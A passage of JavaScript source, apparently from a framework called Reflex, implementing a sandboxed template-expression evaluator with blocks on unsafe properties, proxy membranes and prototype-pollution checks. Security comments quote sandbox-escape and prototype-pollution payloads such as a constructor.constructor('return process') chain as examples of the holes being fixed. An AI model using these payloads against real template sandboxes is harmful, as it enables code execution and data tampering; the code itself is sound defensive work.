          return undefined;
        }
        const meta = obj[META] || reflex._mf.get(obj);
        if (meta) reflex.trackDependency(meta, prop);
        return obj[prop];
      }

      case 'call': {
        let callee, thisArg;
        if (node.callee.type === 'member') {
          thisArg = this._evaluate(node.callee.object, state, context, $event, $el, reflex);
          if (thisArg == null) return undefined;
          const prop = node.callee.computed
            ? this._evaluate(node.callee.property, state, context, $event, $el, reflex)
            : node.callee.property;

          // Security: Block calls to dangerous methods
          if (UNSAFE_METHODS[prop] || UNSAFE_PROPS[prop]) {
            console.warn('Reflex: Blocked call to unsafe method:', prop);
            return undefined;
          }

          callee = thisArg[prop];
        } else {
          callee = this._evaluate(node.callee, state, context, $event, $el, reflex);
          thisArg = undefined;
        }
        if (typeof callee !== 'function') return undefined;
        const args = node.arguments.map(a => this._evaluate(a, state, context, $event, $el, reflex));

        // CRITICAL SECURITY FIX #3: SafeExprParser Context Leak (this binding)
        //
        // VULNERABILITY: Functions can return `this` to leak the state proxy
        // Example: state = { getSelf: function() { return this; } }
        //          Template: {{ getSelf().constructor.constructor('return process')() }}
        //
        // SOLUTION: Wrap the result in a membrane that blocks dangerous properties
        // This prevents access to constructor, __proto__, and other escape vectors
        const result = callee.apply(thisArg, args);

        // If result is an object, wrap it in a protective membrane
        if (result !== null && typeof result === 'object') {
          return new Proxy(result, {
            get(target, key) {
              // Block access to dangerous properties on returned objects
              if (typeof key === 'string' && (UNSAFE_PROPS[key] || isDangerousPropertyPattern(key))) {
                if (typeof process === 'undefined' || process.env?.NODE_ENV !== 'production') {
                  console.warn('Reflex Security: Blocked access to unsafe property on function return value:', key);
                }
                return undefined;
              }
              const value = target[key];
              // Recursively wrap returned objects
              if (value !== null && typeof value === 'object') {
                return new Proxy(value, this);
              }
              return value;
            },
            set() {
              // Block all property assignments on returned objects
              throw new Error('Reflex Security: Cannot modify properties on function return values');
            }
          });
        }

        return result;
      }

      case 'binary': {
        const left = () => this._evaluate(node.left, state, context, $event, $el, reflex);
        const right = () => this._evaluate(node.right, state, context, $event, $el, reflex);
        switch (node.op) {
          case '+': return left() + right();
          case '-': return left() - right();
          case '*': return left() * right();
          case '/': return left() / right();
          case '%': return left() % right();
          case '===': return left() === right();
          case '!==': return left() !== right();
          case '==': return left() == right(); // eslint-disable-line eqeqeq
          case '!=': return left() != right(); // eslint-disable-line eqeqeq
          case '<': return left() < right();
          case '>': return left() > right();
          case '<=': return left() <= right();
          case '>=': return left() >= right();
          case '&&': return left() && right();
          case '||': return left() || right();
          case '??': { const l = left(); return l != null ? l : right(); }
          case 'in': {
            const prop = left();
            const obj = right();
            // Security: Block 'in' operator on unsafe objects
            if (obj == null || typeof obj !== 'object') return false;

            // CRITICAL SECURITY FIX #10: SafeExprParser Blacklist Probing
            //
            // VULNERABILITY: Returning false for unsafe properties leaks information
            // Attacker can probe: {{ 'constructor' in obj }} returns false (blocked)
            //                    {{ 'foo' in obj }} returns true/false (allowed)
            // This confirms which properties are protected, aiding bypass attempts
            //
            // SOLUTION: Throw error consistently for unsafe property checks
            // This stops the attack trace and prevents information disclosure
            if (UNSAFE_PROPS[prop] || isDangerousPropertyPattern(prop)) {
              throw new TypeError(
                `Reflex Security: Cannot check unsafe property '${prop}' with 'in' operator.\n` +
                'This property is restricted to prevent sandbox escape.'
              );
            }
            // Use safe property check that works with reactive proxies
            return prop in obj;
          }
          default: return undefined;
        }
      }

      case 'unary': {
        const arg = this._evaluate(node.arg, state, context, $event, $el, reflex);
        switch (node.op) {
          case '!': return !arg;
          case '-': return -arg;
          case '+': return +arg; // CRITICAL FIX: Support unary plus for string-to-number coercion
          case 'typeof': return typeof arg;
          default: return undefined;
        }
      }

      case 'ternary': {
        const cond = this._evaluate(node.condition, state, context, $event, $el, reflex);
        return cond
          ? this._evaluate(node.consequent, state, context, $event, $el, reflex)
          : this._evaluate(node.alternate, state, context, $event, $el, reflex);
      }

      case 'array':
        return node.elements.map(e => this._evaluate(e, state, context, $event, $el, reflex));

      case 'object': {
        const obj = {};
        for (const prop of node.properties) {
          const key = prop.computed
            ? this._evaluate(prop.key, state, context, $event, $el, reflex)
            : prop.key;
          // CRITICAL SECURITY FIX #1: Prototype Pollution via Object Literals
          // Validate key against UNSAFE_PROPS and dangerous patterns before assignment
          // Without this, {{ { ["__proto__"]: { polluted: true } } }} pollutes Object.prototype
          if (UNSAFE_PROPS[key] || isDangerousPropertyPattern(key)) {
            console.warn('Reflex: Blocked unsafe object key in literal:', key);
            continue; // Skip this property
          }
          obj[key] = this._evaluate(prop.value, state, context, $event, $el, reflex);
        }
        return obj;
      }

      default:
        return undefined;
    }
  }
}
